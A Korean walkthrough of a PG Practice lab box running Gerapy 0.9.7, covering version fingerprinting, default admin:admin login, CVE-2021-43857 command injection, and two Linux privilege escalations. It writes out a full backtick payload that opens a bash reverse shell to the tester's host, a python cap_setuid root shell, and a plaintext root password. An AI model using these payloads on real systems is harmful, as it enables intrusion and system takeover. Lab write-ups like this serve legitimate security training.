> [!info] PG Practice — Pentester Foundations #3
> **타겟** 192.168.248.24 · **OS** Ubuntu 22.04 · **난이도** Fundamental · **플래그 2개**
> **경로 요약** 8000 Gerapy `admin:admin` → 프로젝트 생성(선행조건) → `parse` 명령주입(CVE-2021-43857) → `app` → **권한상승 2경로**: `python3.10` cap_setuid / `app.service` 평문 root 비밀번호

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.24
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
```

포트가 딱 둘이다. `WSGIServer 0.2` = **Django 개발 서버**. 이 배너 자체가 정보다 — 운영 환경에 개발 서버를 띄웠다는 뜻이고, 그렇다면 `DEBUG = True`일 가능성이 높다.

`<title>Gerapy</title>` 로 제품 확정. Gerapy = Scrapy 분산 크롤러 관리 UI(Django 기반).

### 버전 특정 — 독립 증거 3개로 못박기

[[Hub]]에서 `readme.txt` 하나를 믿었다가 버전을 틀렸다. 그 교훈을 적용해 **출처가 서로 다른 근거 3개**로 교차 검증했다.

**증거 A — 라이브 URLconf의 트레일링 슬래시** (런타임, 최강)

`DEBUG=True` 덕에 404가 URLconf를 덤프한다. Gerapy는 **0.9.8에서 URL 패턴의 끝 슬래시를 제거**했으므로 이게 그대로 판별자가 된다.

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/zzz404 | grep -oE '\^api/(client|task|index/status)/?\$'
^api/index/status/$
^api/client/$
^api/task/$
```

PyPI에서 0.9.5~0.9.11 sdist를 받아 `gerapy/server/core/urls.py`를 해시하면 두 그룹으로 갈린다:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ md5sum gerapy-0.9.*/gerapy/server/core/urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.5/.../urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.6/.../urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.7/.../urls.py   ← 슬래시 있음
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.8/.../urls.py   ← 슬래시 없음
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.9/.../urls.py
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.11/.../urls.py
```

→ 타겟은 **{0.9.5, 0.9.6, 0.9.7} 중 하나**이고 **0.9.8 이상은 확실히 아니다.**

**증거 B — webpack 자산 해시** (A와 독립. 파일 내용에서 파생된 값이라 위조가 어렵다)

프런트엔드 번들 파일명에 콘텐츠 해시가 박혀 있다. 라이브가 참조하는 30개 자산명을 공식 wheel과 대조하면:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/ | grep -oE 'app\.[0-9a-f]+\.js'
app.21167fa2.js
```

| 버전 | 30개 자산명 일치 수 | 메인 번들 |
|---|---|---|
| 0.9.5 | 0 / 30 | `app.747409e0.js` |
| 0.9.6 | 0 / 30 | `app.747409e0.js` |
| **0.9.7** | **30 / 30** | **`app.21167fa2.js`** |
| 0.9.8 | 7 / 30 | `app.6999e9f7.js` |

**A ∩ B = 0.9.7 확정.**

**증거 C — UI 푸터 문자열** (런타임이지만 출제자가 손댐 → 최약)

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/static/js/app.21167fa2.js | grep -oE 'Gerapy v[0-9.]+'
Gerapy v0.9.7
```

> [!warning] 이 근거는 출제자가 조작한 것이다
> 서빙되는 `app.21167fa2.js`는 **26541바이트, 정품 0.9.7 wheel은 26533바이트** — 8바이트 차이가 난다.
> `cmp -l`로 좁히면 편집은 정확히 두 군데다: 기본 로케일 `lang:"zh"` → `lang:"en"`, 그리고 **푸터에 버전 문자열 삽입**(정품 0.9.7은 `Gerapy All Rights Reserved.`로 버전이 **없다**).
> 즉 이 푸터는 상류 산출물이 아니라 **박스 제작자가 찍어준 표식**이다. A·B와 일치하지만 셋 중 가장 약한 근거로 취급한다.

> [!tip] 버전 특정의 일반 절차
> 1. **런타임 동작의 차이**를 찾는다 — URL 패턴, API 응답 필드, 에러 메시지 형식. 릴리스 노트의 "Breaking change"가 곧 판별자다.
> 2. **콘텐츠 해시가 박힌 정적 자산**(webpack/vite 번들)을 공식 배포본과 대조한다. 파일 내용에서 파생되므로 신뢰도가 높다.
> 3. 후보를 좁혔으면 **PyPI/npm/GitHub에서 실제 배포본을 받아 diff**한다. 추측하지 말고 대조한다.
> 4. **출처가 다른 근거 2개 이상이 교차할 때만 확정**한다. 근거 3개가 전부 같은 파일에서 나왔다면 그건 근거 1개다.

CVE-2021-43857은 **0.9.8에서 패치**됐다. 0.9.7 확정 = 취약.

### Django DEBUG=True — 공짜 엔드포인트 지도

존재하지 않는 경로를 때리면 Django가 **URLconf 전체를 덤프**한다.

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/nonexistent | grep -oE '\^api/[^<]*' | head
^api/project/(\S+)/parse
^api/project/create
^api/project/index
...
```

> [!tip] `DEBUG = True`는 그 자체로 취약점이다
> 404 페이지가 **전체 라우팅 테이블**을 뱉는다. 디렉터리 브루트포싱을 할 필요조차 없다.
> Django/Flask 계열을 만나면 **아무 경로나 하나 때려서 스택트레이스가 나오는지부터 확인**한다. 나오면 열거는 거기서 끝이다.

### 인증 — 기본 자격증명

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X POST http://192.168.248.24:8000/api/user/auth \
     -H 'Content-Type: application/json' \
     -d '{"username":"admin","password":"admin"}'
{"token":"710dcf5387645f05a0484347be4a8509ea749008"}
```

**`admin:admin`** 성립. 이후 모든 요청에 `Authorization: Token <값>` 을 붙인다.

전체 API를 훑어보면 **비인증으로 열린 것은 `/api/user/auth` 하나뿐**이고 나머지는 전부 `401 {"detail":"Authentication credentials were not provided."}`다. 즉 **이 토큰 하나가 모든 것의 관문**이었고, 기본 자격증명이 아니었다면 이 박스는 SSH 브루트포스 외에 길이 없었다.

DRF는 `OPTIONS`에 비인증으로 스키마를 내준다 — 파라미터 이름을 모를 때 유용하다:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X OPTIONS http://192.168.248.24:8000/api/user/auth
{"name":"Obtain Auth Token","renders":["application/json"],
 "actions":{"POST":{"username":{"type":"string","required":true},
 "password":{"type":"string","required":true},
 "token":{"type":"string","required":false,"read_only":true}}}}
```

### Foothold — CVE-2021-43857 명령주입

취약점은 `/api/project/<name>/parse` 의 **`spider` 파라미터**가 `shell=True` 서브프로세스로 흘러가는 것이다. 백틱이 그대로 실행된다.

> [!danger] EDB 50640은 깨끗한 박스에서 그냥 죽는다
> `searchsploit -m 50640` 으로 받은 스크립트는 `/api/project/index` 응답에서 `dict3[0]['name']` 을 읽는다.
> **Levram에는 프로젝트가 0개**라서 곧바로 `IndexError`로 터진다.
> 브리핑은 "프로젝트 생성 기능을 통해 명령이 실행된다"고 하는데, 정확히는 **프로젝트 생성은 선행조건**이고 주입 지점은 `parse` 다.
> **프로젝트를 하나 만들고 나면 스크립트도 그대로 동작한다.**

선행조건 — 프로젝트 생성:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ TOK=710dcf5387645f05a0484347be4a8509ea749008

┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X POST http://192.168.248.24:8000/api/project/create \
     -H "Authorization: Token $TOK" -H 'Content-Type: application/json' \
     -d '{"name":"pwn","description":"pwn"}'
{"id": 1, "name": "pwn", ...}
```

주입 — 리스너를 먼저 띄우고:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ tmux new-session -d -s levram 'rlwrap nc -lvnp 4444'

┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X POST http://192.168.248.24:8000/api/project/pwn/parse \
     -H "Authorization: Token $TOK" -H 'Content-Type: application/json' \
     -d '{"spider":"`/bin/bash -c '"'"'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1'"'"'`"}'
```

```bash
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.24] 46158
bash: cannot set terminal process group (846): Inappropriate ioctl for device
app@ubuntu:~/gerapy$ id
uid=1000(app) gid=1000(app) groups=1000(app)
```

프로젝트를 만든 뒤라면 스크립트 방식도 동일하게 통한다:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ python3 50640.py -t 192.168.248.24 -p 8000 -L 192.168.45.207 -P 4445
[*] Found project: pwn
```

user 플래그:

```bash
app@ubuntu:~$ cat /home/app/local.txt
367447fc2401d598d4368ed12eb7ca2d
```

### Privesc A — `python3.10` cap_setuid

```bash
app@ubuntu:~$ getcap -r / 2>/dev/null
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep          ← 이것
/usr/bin/ping cap_net_raw=ep
```

`ping`·`mtr-packet`의 `cap_net_raw`는 정상 설정이다. **`python3.10`에 `cap_setuid`가 붙은 것만이 비정상**이다. 노이즈 속에서 이걸 골라내는 게 요령이다.

```bash
app@ubuntu:~$ /usr/bin/python3.10 -c "import os;os.setuid(0);os.system('/bin/bash')"
root@ubuntu:~/gerapy# id
uid=0(root) gid=1000(app) groups=1000(app)
```

> [!warning] `os.setgid(0)`을 같이 넣으면 실패한다
> ```
> PermissionError: [Errno 1] Operation not permitted
> ```
> 붙어 있는 capability는 **`cap_setuid` 하나뿐**이라 gid는 못 바꾼다. GTFOBins 원문 그대로 `setuid`만 호출할 것.
> 결과적으로 `gid=1000(app)`이 남는다 — `proof.txt`를 읽기엔 충분하지만 **깨끗한 root 컨텍스트는 아니다.**

### Privesc B — systemd 유닛 파일의 평문 비밀번호

`/etc/systemd/system/*.service`는 기본이 world-readable이다. 셸을 잡으면 반사적으로 훑는다.

```bash
app@ubuntu:~$ cat /etc/systemd/system/app.service
[Unit]
Description=Gerapy app service

# root:4!m?C%7k@Xb?XNH0!>6K          ← 주석에 root 비밀번호

[Service]
User=app
Type=simple
ExecStart=/bin/bash /home/app/run.sh

[Install]
WantedBy=multi-user.target
```

```bash
app@ubuntu:~$ su root
Password: 4!m?C%7k@Xb?XNH0!>6K
root@ubuntu:/home/app/gerapy# id
uid=0(root) gid=0(root) groups=0(root)
```

**B가 A보다 낫다** — uid/gid/groups 전부 0인 완전한 root이고, 같은 비밀번호로 **SSH 직접 로그인**이 되므로 리버스셸에 의존하지 않는 안정적인 발판이 된다.

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ ssh root@192.168.248.24
root@ubuntu:~# cat proof.txt
aaa7973d6eecab6c5268390c53579801
```

### 플래그 / 자격증명

| | |
|---|---|
| `local.txt` | `367447fc2401d598d4368ed12eb7ca2d` |
| `proof.txt` | `aaa7973d6eecab6c5268390c53579801` |

| 대상 | 자격증명 |
|---|---|
| Gerapy 웹 UI (8000) | `admin` / `admin` |
| 시스템 root | `root` / `4!m?C%7k@Xb?XNH0!>6K` |
| API 토큰 (세션) | `710dcf5387645f05a0484347be4a8509ea749008` |

## OSCP 관점 정리

1. **버전은 출처가 다른 근거 2개 이상으로 확정한다.** 런타임 동작 차이(URL 패턴의 트레일링 슬래시) + 콘텐츠 해시 자산(webpack 번들명)이 교차해서 0.9.7이 나왔다. [[Hub]]에서는 근거 3개가 전부 "2019년 배포본 잔존물"이라는 **같은 출처**여서 틀렸다 — **근거의 개수가 아니라 독립성**이 관건이다.
2. **`WSGIServer` 배너 = Django 개발 서버 = `DEBUG=True` 의심.** 아무 경로나 때려서 스택트레이스/URLconf가 나오면 **디렉터리 열거를 건너뛴다.** 여기서는 404 하나로 `^api/project/(\S+)/parse` 라는 주입 지점을 그대로 얻었다.
3. **공개 익스플로잇이 죽으면 스크립트를 읽어라.** EDB 50640은 "프로젝트가 최소 1개 존재"를 암묵적 전제로 깔고 있어서 깨끗한 박스에서 `IndexError`로 터진다. 에러 메시지만 보고 "타겟이 안 취약하다"고 결론내면 박스를 놓친다. **스크립트가 뭘 가정하는지 확인하고 그 전제를 직접 만들어준다.**
4. **`getcap -r / 2>/dev/null`은 리눅스 privesc 반사 동작.** `ping`의 `cap_net_raw` 같은 정상 항목이 섞여 나오므로 **비정상만 골라내는 눈**이 필요하다 — 인터프리터(`python`, `perl`, `ruby`)나 `tar`·`gdb`에 붙은 capability가 그것이다.
5. **capability는 정확히 부여된 것만 쓸 수 있다.** `cap_setuid`만 있으면 `os.setgid(0)`은 `EPERM`이다. GTFOBins 원문을 임의로 "보강"하지 말 것.
6. **`/etc/systemd/system/`은 크리덴셜 창고다.** world-readable이 기본이고 관리자가 주석에 비밀번호를 적어두는 일이 흔하다. `cat /etc/systemd/system/*.service`, `systemctl cat <서비스>`를 열거 체크리스트에 넣는다.
7. **권한상승 경로가 둘이면 둘 다 확인한다.** capability 경로는 `gid`가 남는 반쪽 root였고, 비밀번호 경로는 완전한 root + SSH 재접속까지 줬다. **시험에서는 "안정적인 발판"이 되는 쪽을 택한다.**

## 남긴 흔적 (랩 정리용)

Gerapy에 프로젝트 `pwn`(id 1) 생성됨. 지우려면 `POST /api/project/pwn/remove`. 랩 Stop/Revert 시 소멸.
`/root/email3.txt`(8바이트)가 있으나 플래그와 무관해 열지 않았다.

## 관련 노트

- [[01. Pentest Foundations]] — Levram 항목
- [[Crane]] · [[Hub]] — 같은 컬렉션 앞 박스
